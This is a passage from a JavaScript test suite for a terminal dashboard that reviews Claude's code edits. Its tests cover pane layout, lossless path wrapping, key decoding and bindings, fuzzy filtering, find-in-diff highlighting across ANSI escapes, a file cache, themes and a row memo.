  // exist and cannot tell — strictly worse than truncation, which at least announces itself. Two
  // real defects came out of this: a `join(' ')` that welded `handler.md` into `handle r.md`, and a
  // check that hard-coded the pane width one column short and blamed the renderer for its own cut.
  //
  // The assertion deliberately does NOT normalise whitespace. Squashing spaces out before comparing
  // makes `handle r.md` and `handler.md` identical — it would have passed the very bug that prompted
  // this test. A path has no spaces, so it must come back with none injected.
  const long = 'plans/there-s-a-very-long-directory-name/and-another-one/deeply-nested-file.ts';
  const shown = 'and-another-one/deeply-nested-file.ts'; // rowsFor abbreviates to parent/basename
  const st = paneFixture({
    views: { list: { edits: [{ id: 7, file: long, added: 12, removed: 3, state: 'pending', ts: 0 }] } },
  });
  const reassemble = (f, box) =>
    f
      .slice(box.body.y, box.body.y + box.body.h)
      .map((l) => l.slice(0, box.rect.w).replace(/\s+$/, ''))
      .map((l) => l.slice(1)) // drop the cursor gutter column, which is chrome, not content
      .map((l) => {
        const m = l.match(/^\s*▸(.*)$/); // a continuation contributes only its own text
        return m ? m[1] : l;
      })
      .join('');

  for (const cols of [60, 70, 80, 100, 120]) {
    const lay = tui.resolveLayout({ cols, rows: 30, minimized: new Set(), focus: 'traces' });
    const box = lay.boxes.find((b) => b.id === 'traces');
    if (!box) continue; // width from the LAYOUT, never a hand-written constant
    const got = reassemble(tui.renderDashFrame(st, { cols, rows: 30, color: false }), box);
    assert.ok(got.includes(shown), `cols=${cols}: the path must survive wrapping intact\n  want: ${shown}\n  got:  ${got}`);
  }

  // Positive control: the exact defect this guards against — rejoining hard-broken pieces with a
  // space — must fail the same `includes` check, or the assertions above prove nothing.
  const parts = tui.wrapVisible(shown, 20);
  assert.ok(parts.length > 1, 'the fixture really does wrap');
  assert.equal(parts.join(''), shown, 'wrapVisible itself is lossless for a space-free token');
  assert.ok(!parts.join(' ').includes(shown), 'and a space-rejoin corrupts it, so the check can fail');
});

test('panes: the selection is said ONCE, and stays legible with no colour at all', () => {
  // The row used to carry a `>` marker AND a colour band — one fact stated twice, on every list on
  // screen. Colour now carries it alone, and the marker is what is left when there is no colour.
  // The state glyph must survive either way: overwriting the row's first cell with the marker ate the
  // pending/kept/undone mark, which is the one thing the reader is there to act on.
  const st = paneFixture({ panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: { traces: 0 }, scroll: {} } });
  const lay = tui.resolveLayout({ cols: 120, rows: 30, minimized: new Set(), focus: 'traces' });
  const box = lay.boxes.find((b) => b.id === 'traces');

  const plain = tui.renderDashFrame(st, { cols: 120, rows: 30, color: false })[box.body.y];
  assert.match(plain, /^>[?+x✓✗]/, `no colour: marker then state glyph, got ${JSON.stringify(plain.slice(0, 6))}`);

  const lit = tui.renderDashFrame(st, { cols: 120, rows: 30, color: 'truecolor' })[box.body.y];
  assert.ok(/^\x1b\[7m/.test(lit), `with colour the focused row is a band, got ${JSON.stringify(lit.slice(0, 12))}`);
  const visible = lit.replace(/\x1b\[[0-9;]*m/g, '');
  assert.match(visible, /^ [?+x✓✗]/, `and the gutter is blank, not an arrow: ${JSON.stringify(visible.slice(0, 6))}`);

  // An UNFOCUSED pane paints NO band at all — the faint "context" band was tried and read as a
  // second selected item both times a user looked at it (N7, then N16). One selection on screen.
  const un = paneFixture({ panes: { minimized: new Set(), zoom: null, focus: 'detail', tab: {}, cursor: { traces: 0 }, scroll: {} } });
  const other = tui.renderDashFrame(un, { cols: 120, rows: 30, color: 'truecolor' })[box.body.y];
  assert.ok(!/^\x1b\[7m/.test(other) && !/^\x1b\[48;2;/.test(other) && !/^\x1b\[100m/.test(other),
    `an unfocused pane's cursor row carries no band, got ${JSON.stringify(other.slice(0, 14))}`);
});

test('panes: a size that cannot hold a window says what it would take', () => {
  const f = tui.renderDashFrame(paneFixture(), { cols: 60, rows: 24, color: false });
  const status = f[f.length - 2];
  assert.match(status, /Detail needs 67 cols/, 'the status row names the cost, rather than the window just being gone');
  // And the window keeps its chip on the bar, so its jump key and counter never disappear.
  assert.match(f[0], /F5 .?Diff/, 'Detail keeps both its chips when minimized');
});

test('panes: zoom announces itself, and names the edit it is showing', () => {
  const st = paneFixture({
    panes: { minimized: new Set(), zoom: 'detail', focus: 'detail', tab: {}, cursor: {}, scroll: {} },
    diffPatch: '@@ -1,2 +1,3 @@\n keep\n-was\n+now\n',
    diffMeta: { id: 5, path: '/w/pkg/src/a.ts', added: 1, removed: 1, verb: 'Write' },
  });
  const f = tui.renderDashFrame(st, { cols: 120, rows: 30, color: false });
  assert.match(f[0], /ZOOM Detail/, 'a zoom that is not announced leaves "why can I only see one thing" unanswered');
  // Full screen is where the surrounding list is GONE, so the status row becomes the edit's address.
  assert.match(f[f.length - 2], /edit #5 · \/w\/pkg\/src\/a\.ts/, 'the status row names the edit and its whole path');
  // And the path is never cut to fit: a narrow frame drops to a shorter form rather than a false one.
  // Sweeping every width also proves the ladder never emits a path that was trimmed to fit.
  for (let cols = 12; cols <= 60; cols++) {
    const bar = tui.renderDashFrame(st, { cols, rows: 30, color: false })[28].trimEnd();
    assert.ok(
      /^edit #5( · (\/w\/pkg\/src\/a\.ts|pkg\/src\/a\.ts))?$/.test(bar) || bar === '',
      `no truncated path at ${cols} cols, got ${JSON.stringify(bar)}`
    );
  }
  // A zoom is the reader closing the other panes on purpose, so nothing may report what they "need".
  assert.doesNotMatch(f[f.length - 2], /needs \d+ (cols|body rows)/, 'a zoom does not price the panes it hid');
});

test('dashframe: an overlay with a cursor is a picker, one without is a reader', () => {
  // The runtime distinguishes the two by `cursor`, and dispatches Enter differently for each. If a
  // reader-overlay ever grew a cursor it would silently become selectable, so the contract is pinned
  // here: the rendered picker marks exactly one row, and the reader marks none.
  const lines = [' one', ' two', ' three'];
  const reader = tui.renderDashFrame(dashFixture({ overlay: { title: 'settings', lines, scroll: 0 } }), { cols: 60, rows: 10, color: false });
  assert.equal(reader.filter((l) => l.startsWith('>')).length, 0, 'a reader overlay marks no row');
  const picker = tui.renderDashFrame(dashFixture({ overlay: { title: 'menu', lines, scroll: 0, cursor: 1 } }), { cols: 60, rows: 10, color: false });
  assert.equal(picker.filter((l) => l.startsWith('>')).length, 1, 'a picker marks exactly one');
});

test('dashframe: a WRAPPED row does not move the selection to a different row', () => {
  // The overlay expands each logical line into as many visual lines as it needs, then marked the
  // cursor by comparing it against a position in that EXPANDED list — while `cursor` indexes the
  // logical ones. Every wrap above the cursor shifted the highlight down by one, so the reader
  // arrowed onto "three" and the frame highlighted "two". It stayed hidden while every row fit on one
  // line, which is exactly what stopped being true when the session picker grew its cost columns.
  const long = ` ${'wide '.repeat(20)}`; // comfortably past `cols`, so it wraps
  const lines = [long, ' two', ' three'];
  const at = (cursor) => {
    const f = tui.renderDashFrame(dashFixture({ overlay: { title: 'menu', lines, scroll: 0, cursor } }),
      { cols: 40, rows: 14, color: false });
    return f.filter((l) => l.startsWith('>')).map((l) => l.slice(1).trim());
  };
  // Positive control: without a wrap the mapping was already right, so the fixture has to wrap at all.
  const flat = tui.renderDashFrame(dashFixture({ overlay: { title: 'menu', lines, scroll: 0, cursor: 0 } }),
    { cols: 40, rows: 14, color: false });
  assert.ok(flat.filter((l) => l.trim()).length > lines.length + 1, 'the fixture must actually wrap');

  assert.deepEqual(at(1), ['two'], 'the cursor lands on the row it indexes, not one displaced by the wrap');
  assert.deepEqual(at(2), ['three'], 'and stays correct further down the list');
  // The wrapped row itself is marked across ALL of its visual lines, so a selection reads as one block
  // rather than as a highlighted fragment with an unhighlighted tail.
  assert.ok(at(0).length > 1, `a wrapped selection marks every line it occupies, got ${at(0).length}`);
});

test('dashframe: an open filter is visible before a single character is typed', () => {
  // The keys row used to print the prompt only when the buffer was non-empty, so pressing `/` looked
  // identical to normal mode. An invisible mode that swallows keystrokes is indistinguishable from a
  // frozen dashboard — and in the runtime those keystrokes were reaching `a`(keep) and `u`(undo).
  const keys = (over) => {
    const f = tui.renderDashFrame(dashFixture(over), { cols: 100, rows: 20, color: false });
    return f[f.length - 1].trim();
  };
  assert.equal(keys({ filterOpen: true }), '/_', 'the prompt appears the moment the mode opens');
  assert.equal(keys({ filterOpen: true, filter: 'readme' }), '/readme_', 'and carries a caret while typing');
  assert.equal(keys({ filterOpen: false, filter: 'readme' }), '/readme', 'a applied filter shows without the caret');
  assert.notEqual(keys({}), keys({ filterOpen: true }), 'normal mode and filter mode never render the same');
});

test('dashframe: a pending confirmation states the verb, the real count, and the answer keys', () => {
  const f = tui.renderDashFrame(
    dashFixture({ confirm: { verb: 'undo', ids: [1, 2, 3], label: 'every row listed' } }),
    { cols: 100, rows: 20, color: false }
  );
  const status = f[f.length - 2].trim();
  assert.match(status, /undo 3 edit\(s\)/, 'the REAL count, so a bulk revert is never a surprise');
  assert.match(status, /\[y\/n\]/, 'and the keys that answer it — which the runtime must actually bind');
});

test('fscache: the shared text layer sees an append, and never serves a stale transcript', () => {
  // The whole point of this layer is that ten derivations read one transcript once instead of 46
  // times. That is only safe if a GROWING file — the live-session case, which is the case the
  // dashboard exists for — is never served from cache after it changes. The stamp is
  // (mtimeMs:size:ino), and size moves on append, so this must hold.
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const f = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'obs-fscache-')), 't.jsonl');

  fs.writeFileSync(f, 'one\ntwo\n');
  const first = core.readLines(f);
  assert.deepEqual(first, ['one', 'two', ''], 'reads the file');

  // Positive control: a SECOND read with no change must come from the cache, or this test cannot
  // distinguish "invalidated correctly" from "never cached at all".
  assert.strictEqual(core.readText(f), core.readText(f), 'unchanged file is served from cache');

  fs.appendFileSync(f, 'three\n');
  const after = core.readLines(f);
  assert.ok(after.includes('three'), `an append must be visible, got ${JSON.stringify(after)}`);
  assert.equal(after.length, first.length + 1, 'exactly one line more');

  // And a truncation/replacement (a GC'd or rewritten transcript) must not serve the longer text.
  fs.writeFileSync(f, 'only\n');
  assert.deepEqual(core.readLines(f), ['only', ''], 'a shrunken file is re-read, not served long');

  fs.rmSync(path.dirname(f), { recursive: true, force: true });
});

test('dash: every advertised key is bound, under the name the decoder really emits', () => {
  // Three keys shipped advertised and dead. `e` had no handler at all. `Tab` and `^D` were written in
  // the runtime as the BYTES '\t' and '\x04' while the decoder hands over the names `tab` and
  // `d`+ctrl, so those comparisons could never be true — a defect no amount of reading the switch
  // would reveal, because both spellings look correct in isolation. So: run the decoder.
  const bytes = {
    // A lone ESC is the Escape KEY only once nothing follows it, so it resolves through `flush()` —
    // which is exactly why the loop below concatenates the flush rather than trusting `push` alone.
    tab: '\t', enter: '\r', escape: '\x1b', backspace: '\x7f',
    up: '\x1b[A', down: '\x1b[B', right: '\x1b[C', left: '\x1b[D',
    pgup: '\x1b[5~', pgdn: '\x1b[6~',
    f1: '\x1bOP', f2: '\x1bOQ', f3: '\x1bOR', f4: '\x1bOS',
  };
  for (const [name, seq] of Object.entries(bytes)) {
    const d = tui.createDecoder();
    const got = d.push(seq).concat(d.flush()).filter((e) => e.t === 'key').map((e) => e.key);
    assert.ok(got.includes(name), `${JSON.stringify(seq)} decodes to ${name}, got ${JSON.stringify(got)}`);
    assert.ok(tui.KEY_BINDINGS.has(name), `…and ${name} is bound`);
  }
  // ^C and ^D arrive NAMED with ctrl set, never as the raw byte.
  for (const [seq, name] of [['\x03', 'c'], ['\x04', 'd']]) {
    const ev = tui.createDecoder().push(seq).find((e) => e.t === 'key');
    assert.deepEqual({ key: ev.key, ctrl: ev.ctrl }, { key: name, ctrl: true }, `${JSON.stringify(seq)} is ctrl+${name}`);
    assert.ok(tui.KEY_BINDINGS.has(name), `…and ${name} is bound`);
  }
  // F-keys have several encodings in the wild, and every one has to reach the same binding.
  for (const seq of ['\x1bOP', '\x1b[11~', '\x1b[1P', '\x1b[P']) {
    assert.equal(tui.createDecoder().push(seq).find((e) => e.t === 'key').key, 'f1', `${JSON.stringify(seq)} is F1`);
  }

  // And the other direction: every single-key token the frame ADVERTISES must be bound. This is the
  // assertion that would have caught `e $EDITOR` sitting in the key row with no handler.
  const advertised = new Set();
  for (const hint of tui.KEY_HINTS) {
    for (const tok of hint.split(' · ')) {
      for (const m of tok.matchAll(/(?:^|[ /])(Tab|[a-zA-Z=+<>[\]/?])(?=[ /]|$)/g)) advertised.add(m[1]);
    }
  }
  assert.ok(advertised.size >= 6, `the scrape must actually find keys, got ${JSON.stringify([...advertised])}`);
  for (const k of advertised) {
    const name = /^F[1-4]$/.test(k) ? k.toLowerCase() : k === 'Tab' ? 'tab' : k;
    assert.ok(tui.KEY_BINDINGS.has(name), `the key row advertises ${k}, so something must handle it`);
  }
  // Nothing may advertise j/k any more — arrows are the only way to move.
  for (const hint of tui.KEY_HINTS) assert.doesNotMatch(hint, /\bj\/k\b|\bj\b|\bk\b/, `no j/k in ${JSON.stringify(hint)}`);
  assert.ok(!tui.KEY_BINDINGS.has('j') && !tui.KEY_BINDINGS.has('k'), 'and they are not bound either');
});

test('tui: the filter matches scattered letters, on every pane, and literals still win', () => {
  // fzf's rule: `pcsi` finds `packages/core/src/index.ts`. `fuzzyMatch` had been written, exported and
  // documented in the help screen — and never called: the pane predicate was still `includes`, so the
  // whole feature was one unreferenced function. An export with no callers is what that looks like.
  // Indices MEASURED, not guessed: the match is greedy left-to-right, so `c` lands on the `c` in
  // "packages" rather than the one in "core". That is fzf's own behaviour and what a highlighter has
  // to render.
  assert.deepEqual(tui.fuzzyMatch('packages/core/src/index.ts', 'pcsi'), [0, 2, 7, 18],
    'a scattered query matches, and reports WHERE, so a caller can highlight it');
  assert.equal(tui.fuzzyMatch('packages/core/src/index.ts', 'zzz'), null, 'and a miss is a miss');
  // Contiguous FIRST: a literal query must behave exactly as it did before the rule changed.
  assert.deepEqual(tui.fuzzyMatch('a.ts', '.ts'), [1, 2, 3], 'a literal hit is the contiguous run, not a scattered one');

  const edits = [
    { id: 1, file: '/w/packages/core/src/index.ts', rel: 'packages/core/src/index.ts', status: 'pending', ts: 3000, added: 1, removed: 0 },
    { id: 2, file: '/w/README.md', rel: 'README.md', status: 'pending', ts: 2000, added: 1, removed: 0 },
  ];
  const shown = (filter) => {
    const st = paneFixture({ views: { list: { edits } }, filter, panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {} } });
    return tui.renderDashFrame(st, { cols: 150, rows: 34, color: false }).join('\n');
  };
  // The PANE, not just the helper — this is the wire that was missing.
  assert.ok(shown('pcsi').includes('index.ts') && !shown('pcsi').includes('README'),
    'the pane narrows by the scattered rule, which is what the help screen promises');
  assert.ok(shown('.ts').includes('index.ts') && !shown('.ts').includes('README'),
    'and a literal still narrows the way it always did');
});

test('tui: syntax colour is opt-in, context-only, and never guesses', () => {
  // The one feature whose cost is on a frame that re-renders per keystroke, so it ships OFF and is
  // applied to the ~40 drawn rows rather than to the patch: measured at +0.04ms per keystroke on a
  // 4,000-line patch, against 0.34ms plain.
  const H = (l) => tui.highlightSource(l, 'truecolor');
  assert.equal(tui.highlightSource('const x = 1;', 'none'), 'const x = 1;', 'at depth none it is a no-op');
  assert.notEqual(H('const x = 1;'), 'const x = 1;', 'a keyword is coloured');
  assert.equal(tui.stripSgr(H('const x = 1; // hi')), 'const x = 1; // hi', 'and the VISIBLE text is never altered');

  // ORDERING is the whole correctness story: a comment swallows the rest of the line, so a keyword
  // inside one must not be coloured as code.
  const commented = H('// const x = 1');
  assert.equal((commented.match(/\x1b\[38/g) || []).length, 1, 'a comment is ONE span — not a comment with a keyword inside it');
  // …and the same for a string.
  const stringy = H('const s = "const y";');
  assert.ok(stringy.includes('"const y"'.slice(0, 1)), 'the string is present');
  assert.equal(tui.stripSgr(stringy), 'const s = "const y";', 'and nothing was dropped colouring it');

  // It must NOT guess: an identifier that merely contains a keyword is not a keyword.
  assert.equal(H('constant = 1').indexOf('\x1b'), 'constant = '.length, 'only the NUMBER is coloured in `constant = 1`');
  // A number glued to an identifier is part of the name.
  assert.equal(tui.stripSgr(H('const x2 = 3')), 'const x2 = 3', 'x2 survives as one token');

  // And the pane applies it only when asked, and only to context lines.
  const patch = '--- a/x.ts\n+++ b/x.ts\n@@ -1,3 +1,3 @@\n const kept = 1;\n-const a = 1;\n+const a = 2;\n';
  const st = (syntax) => paneFixture({
    diffPatch: patch, diffMeta: { id: 1, path: '/w/x.ts', added: 1, removed: 1, verb: 'Edit' }, syntax,
    panes: { minimized: new Set(), zoom: null, focus: 'detail', tab: { detail: 0 }, cursor: {}, scroll: {} },
  });
  const draw = (syntax) => tui.renderDashFrame(st(syntax), { cols: 100, rows: 30, color: true }).join('\n');
  assert.equal(draw(false), draw(undefined), 'off is the default — a reader who never opens the setting sees no change');
  assert.notEqual(draw(true), draw(false), 'and on, it changes what the context line looks like');
});

test('tui: find-in-diff MARKS its matches, and composes with the diff’s own colour', () => {
  // Before this, `/` on the Diff face only scrolled: it put the match somewhere on screen and left the
  // reader to find it by eye in a 341-line patch, which is the half of a find that matters.
  //
  // The hard part is that these lines are the rich diff's own output — banding plus a per-character
  // intra-line pass — so they are dense with SGR. A naive indexOf marks bytes INSIDE an escape (a
  // colour like `38;5;71m` contains both "m" and "5") and splits the sequence, which renders as
  // garbage on the row rather than as a wrong colour.
  assert.equal(tui.highlightVisible('const foo;', ''), 'const foo;', 'an empty needle changes nothing');
  assert.equal(tui.highlightVisible('const foo;', 'zzz'), 'const foo;', 'and neither does a miss');

  const coloured = '\x1b[38;5;71m+const \x1b[1mfoo\x1b[0m = 1;\x1b[0m';
  const marked = tui.highlightVisible(coloured, 'foo');
  assert.notEqual(marked, coloured, 'a hit is marked');
  assert.equal(tui.stripSgr(marked), tui.stripSgr(coloured), 'and the VISIBLE text is untouched — only styling was added');
  assert.ok(marked.includes('\x1b[7m'), 'marked with reverse video, which needs no colour to go back to');
  // The one that catches a naive implementation: "5" appears inside `38;5;71m` and nowhere visible.
  assert.equal(tui.highlightVisible('\x1b[38;5;71mx\x1b[0m', '5'), '\x1b[38;5;71mx\x1b[0m',
    'a needle that occurs only INSIDE an escape sequence is not a match at all');
  // LINEAR in the line, not quadratic in its matches. `spans.some(...)` per character measured 0.43ms
  // for 200 matches and 39.9ms for 3,200 — and a one-character needle on a wide terminal is an
  // ordinary thing to type, which at 45 drawn rows was ~19ms of a single keystroke. Asserted by SHAPE
  // rather than by a wall-clock threshold, which would be a flaky test on shared CI: quadratic growth
  // cannot keep a 4x input inside a 4x time budget, and linear growth comfortably does.
  {
    const line = (k) => Array.from({ length: k }, () => 'aa').join(' ');
    const time = (k) => {
      const l = line(k);
      const t0 = process.hrtime.bigint();
      for (let i = 0; i < 50; i++) tui.highlightVisible(l, 'aa');
      return Number(process.hrtime.bigint() - t0);
    };
    time(400); // warm
    const small = time(400);
    const big = time(1600); // 4x the matches
    assert.ok(big < small * 12, `4x the matches must not cost ~16x the time — was ${(big / small).toFixed(1)}x`);
  }

  // A reset in the middle of a match must not swallow the rest of the highlight.
  const split = tui.highlightVisible('\x1b[1mfo\x1b[0mo', 'foo');
  assert.equal((split.match(/\x1b\[7m/g) || []).length, 3, 'every character of the match is marked, across the reset');

  // …and the pane actually uses it.
  const patch = '--- a/x.ts\n+++ b/x.ts\n@@ -1 +1 @@\n-const alpha = 1;\n+const beta = 2;\n';
  const st = (findNeedle) => paneFixture({
    diffPatch: patch, diffMeta: { id: 1, path: '/w/x.ts', added: 1, removed: 1, verb: 'Edit' }, findNeedle,
    panes: { minimized: new Set(), zoom: null, focus: 'detail', tab: { detail: 0 }, cursor: {}, scroll: {} },
  });
  const drawn = (n) => tui.renderDashFrame(st(n), { cols: 100, rows: 30, color: true }).join('\n');
  assert.notEqual(drawn('beta'), drawn(undefined), 'a standing find changes what the Diff face draws');
  assert.ok(drawn('beta').includes('\x1b[7m'), 'and what it adds is the mark');
});

test('tui: a long file keeps its path on screen while you scroll its edits', () => {
  // Traces groups by file, so a file with forty edits scrolls its own header off the top — leaving the
  // reader looking at "#231 +4 −1" rows with nothing saying which file they belong to, one keystroke
  // away from reverting one of them. The path is exactly what you lose while scrolling.
  const edits = Array.from({ length: 40 }, (_, i) => (
    { id: i + 1, file: '/w/big.ts', rel: 'big.ts', status: 'pending', ts: 1000 + i, added: 1, removed: 0 }));
  const draw = (scroll) => tui.renderDashFrame(paneFixture({
    views: { list: { edits } },
    panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: { traces: 0 }, scroll: { traces: scroll } },
  }), { cols: 110, rows: 26, color: false }).join('\n');

  assert.match(draw(0), /big\.ts/, 'unscrolled, the header is simply there');
  // Scrolled past it, it must STILL be there — and the row it sits above must be a later edit, or the
  // pane is not actually scrolled and the check proves nothing.
  const deep = draw(12);
  assert.match(deep, /big\.ts/, 'scrolled into the file, the header is pinned rather than gone');
  assert.match(deep, /#12\b/, 'positive control: the pane really is scrolled past the first edits');
  assert.doesNotMatch(deep, /#1\s+\d+mo ago/, 'and the rows above the scroll point are not being drawn');
  // Drawn ONCE. A pinned copy plus the real row would read as two edits of the same file.
  assert.equal((deep.match(/big\.ts\s+40 edits/g) || []).length, 1, 'the pinned header is not also drawn in the body');
});

test('tui: the theme setting actually changes the colours, and degrades safely', () => {
  // Every tool in this class themes; this had eight hard-coded colours and no setting. The risk of a
  // theme is a hand-edited or newer-version name reaching a build that does not have it, so the
  // fallback is asserted beside the feature.
  const t = (name) => { tui.setTheme(name); return tui.tint('ok', 'kept', 'truecolor'); };
  const dflt = t('default');
  assert.notEqual(t('colorblind'), dflt, 'colorblind is a DIFFERENT palette, not a relabelled default');
  assert.notEqual(t('mono'), dflt, 'and so is mono');
  assert.equal(t('nonesuch'), dflt, 'an unknown name falls back — it runs on the first paint, and must never blank the UI');
  assert.equal(t(undefined), dflt, 'and so does "unset", which is what most readers have');
  // The NAMES live in core, so the settings layer can validate without importing the renderer.
  assert.deepEqual(core.THEME_NAMES, Object.keys(tui.THEMES), 'core validates against exactly what the renderer ships');
  tui.setTheme(undefined); // module state: put it back, or every later render test inherits this one

  // colorblind exists to separate the REVIEW VERDICT pair, which is the one most readers cannot.
  tui.setTheme('colorblind');
  const kept = tui.tint('x', 'kept', 'truecolor');
  const risk = tui.tint('x', 'risk', 'truecolor');
  assert.notEqual(kept, risk, 'kept and risk must not be the same colour — that pair carries the verdict');
  tui.setTheme(undefined);
});

test('tui: the row memo is fast AND cannot serve a stale frame', () => {
  // rowsFor enumerates every row of the session — 2,730 for a 546-file one — and a pane draws about
  // 43. Measured at EIGHT calls per frame (paneVisible and paneRowCount, per pane), on a frame that
  // re-renders per keystroke. Memoising it took a full frame from 2.50ms to 0.48ms.
  //
  // A memo is a correctness risk before it is a speed-up, so every input that changes a rendered row
  // is asserted to invalidate it. The dangerous one is `now`: rows carry ages.
  //
  // THE PAYLOAD OBJECT IS SHARED between calls, deliberately. The memo compares `views` by identity,
  // so a fixture that built a fresh one per call would miss on every lookup — the memo would never be
  // exercised and every assertion below would pass against a key that contained nothing at all. That
  // is exactly what the first version of this test did, and three mutations walked straight through it.
  const views = { list: { edits: [
    { id: 1, file: '/w/zzz.ts', rel: 'zzz.ts', status: 'kept', ts: 1_000_000, added: 900, removed: 0 },
    { id: 2, file: '/w/aaa.ts', rel: 'aaa.ts', status: 'kept', ts: 1_000_000, added: 1, removed: 0 },
  ] } };
  const open = new Set();
  const st = (over) => paneFixture({ views, open, promptScope: null, now: 1_005_000, panes: null, ...over });
  const cells = (over = {}, g) => tui.rowsFor(st(over), 120, g ?? tui.glyphs('block'), 'none').map((r) => r.cells).join('|');

  // The memo HITS: same everything, twice, must be the identical array contents.
  assert.equal(cells(), cells(), 'a repeated call with nothing changed is stable');

  // AGES still tick. A memo that ignored `now` would freeze every timestamp on screen — a correctness
  // bug wearing a speed-up's clothes — and this is the one input that changes on its own.
  assert.match(cells({ now: 1_005_000 }), /5s ago/, 'five seconds after the edit reads as five seconds');
  assert.match(cells({ now: 1_065_000 }), /1m ago/, 'and a minute later it says so, through the memo');

  // A NEW PAYLOAD invalidates, even at the same instant and with every other key component equal.
  const grown = { list: { edits: [...views.list.edits, { id: 3, file: '/w/b.ts', rel: 'b.ts', status: 'kept', ts: 1_000_000, added: 1, removed: 0 }] } };
  assert.notEqual(cells({ views: grown }), cells(), 'a new payload rebuilds rather than reusing the old rows');

  // …and so does every other input the rows are drawn FROM.
  assert.notEqual(cells({}, tui.glyphs('ascii')), cells({}, tui.glyphs('block')),
    'the glyph set is part of the key — asserted on KEPT edits, because a pending one is “?” in both sets');
  assert.notEqual(cells({ filter: 'zzz' }), cells(), 'the filter is part of the key');
  assert.notEqual(cells({ sort: 'path' }), cells({ sort: 'churn' }),
    'and so is the sort — two files ordered oppositely by path and by churn, or this cannot tell');
});

test('tui: marked rows are visible, and a/u act on the whole marked set', () => {
  // Reviewing is "read six files, then accept them together", and until now that meant six keeps and
  // six confirmations. The risk a mark set carries is the opposite of the one it removes: a selection
  // the reader cannot SEE is one they act on by accident, so the marker is asserted on the row.
  const edits = [
    { id: 1, file: '/w/a.ts', rel: 'a.ts', status: 'pending', ts: 3000, added: 1, removed: 0 },
    { id: 2, file: '/w/b.ts', rel: 'b.ts', status: 'pending', ts: 2000, added: 1, removed: 0 },
  ];
  const st = (marked) => paneFixture({ views: { list: { edits } }, marked, panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {} } });
  const draw = (marked) => tui.renderDashFrame(st(marked), { cols: 120, rows: 34, color: false }).join('\n');

  assert.notEqual(draw(new Set([1])), draw(new Set()), 'a marked row LOOKS different — an invisible selection is a footgun');

  // …and the mark is the SCOPE `a`/`u` use. selectionIds is the cursor rule; the marked set overrides
  // it for the single-row scope, which is what makes "mark six, accept once" a thing at all.
  assert.deepEqual(tui.selectionIds(st(new Set([1, 2])), 'one'), [1],
    'selectionIds itself is unchanged — it is the CURSOR rule, and the mark set is applied above it');
  assert.deepEqual(tui.selectionIds(st(new Set()), 'all'), [1, 2], 'and `all` still means every row listed');
});

test('tui: the frame never hard-codes a key it advertises', () => {
  // The session bar read "s to switch" and went on reading it after `s` became sort — and would have
  // lied to anyone who rebound the key in any case. Same lesson the keys screen already learned: a
  // hard-coded letter is a letter that lies to exactly the reader who customised it.
  const st = (keys) => paneFixture({ views: { sessions: { sessions: [1, 2, 3] } }, keys, panes: null });
  const bar = (keys) => tui.renderDashFrame(st(keys), { cols: 100, rows: 20, color: false }).find((l) => /sessions ·/.test(l));
  assert.match(bar(core.keymap({})), /\bb to switch\b/, 'it names the DEFAULT session key, which is b');
  assert.match(bar(core.keymap({ keys: { session: 'X' } })), /\bX to switch\b/, 'and follows a rebind');
  assert.doesNotMatch(bar(core.keymap({ keys: { session: 'X' } })), /\bs to switch\b/, 'without still claiming the old one');
});

test('tui: an empty pane says what to do next, not only that it is empty', () => {
  // "nothing on Traces" is true and useless: it reads the same whether Claude has not edited anything
  // yet, or a filter is hiding every row, or the first payload has not landed. Three different next
  // actions, and the pane is the only place anyone is looking.
  const draw = (extra) => tui.renderDashFrame(
    paneFixture({ views: { list: { edits: [] } }, panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {} }, ...extra }),
    { cols: 120, rows: 34, color: false }).join('\n');

  assert.match(draw({}), /nothing on \w+ yet — it fills in as Claude works/,
    'empty and unfiltered: say it will fill in, so the reader waits instead of hunting for a bug');
  assert.match(draw({ filter: 'zzz' }), /nothing on \w+ matching \/zzz — esc clears the filter/,
    'empty BECAUSE of a filter: name the filter and the key that clears it');
  // The PRE-payload case is already answered upstream, and differently — the panes say "building…"
  // while the first read is in flight. Asserted here so a future "empty pane" message cannot quietly
  // take that case over and start claiming there is nothing when nobody has looked yet.
  assert.match(draw({ views: null }), /building…/,
    'before the first payload the panes say they are building, not that there is nothing');
});

test('tui: `w` keeps long lines long and pans across them, and never hides content', () => {
  // `w` had NO test at all — not here, not in tty-drive — which is how it came to be a key that
  // toggled a flag nothing read. The flag was in the state, the renderer supported panning, and the
  // wire between them was missing, so the whole feature was one boolean that changed nothing.
  // The line NAMES its own columns — `col000|col010|col020…` — so a check can tell which part of it is
  // on screen. A line of 400 identical characters renders the same at every offset, so a pan test over
  // one passes whether the offset is honoured or thrown away, which is the bug this is for.
  const wide = Array.from({ length: 40 }, (_, i) => `col${String(i * 10).padStart(3, '0')}`).join('|');
  const patch = `--- a/w.ts\n+++ b/w.ts\n@@ -1 +1 @@\n-const x = 1;\n+const y = ${wide};\n`;
  const base = {
    diffPatch: patch,
    diffMeta: { id: 1, path: '/w/w.ts', added: 1, removed: 1, verb: 'Edit' },
    panes: { minimized: new Set(), zoom: null, focus: 'detail', tab: { detail: 0 }, cursor: {}, scroll: {} },
  };
  const draw = (extra) => tui.renderDashFrame(paneFixture({ ...base, ...extra }), { cols: 100, rows: 34, color: false }).join('\n');

  // WRAPPING is the default, and it is what keeps the whole line reachable without moving: the 279-column
  // line comes back over several rows, first token to last, with nothing cut off.
  const wrapped = draw({});
  assert.ok(wrapped.includes('col000') && wrapped.includes('col390'),
    'wrapped, the whole line is on screen — this product does not truncate content');

  // Panning is a DIFFERENT rendering, not the same one re-labelled. (Offsets below are measured against
  // this fixture, not guessed: at 100 columns, panX 120 shows col160..col220 and 240 shows col330..col390.)
  const panned = draw({ noWrap: true, panX: 120 });
  assert.notEqual(panned, wrapped, '`w` must change what is drawn — a flag nothing reads is not a feature');
  assert.ok(panned.includes('col160') && !panned.includes('col000'),
    'panning moved the viewport along the line rather than re-wrapping it');

  // …and panning FURTHER moves it further. This is the assertion that fails if panX is accepted and then
  // dropped on the floor, which is what the wiring did before.
  const further = draw({ noWrap: true, panX: 240 });
  assert.notEqual(further, panned, 'panning further shows a different part of the line');

  // NOTHING IS OUT OF REACH: panned to the far right, the LAST token of a 279-column line is on screen.
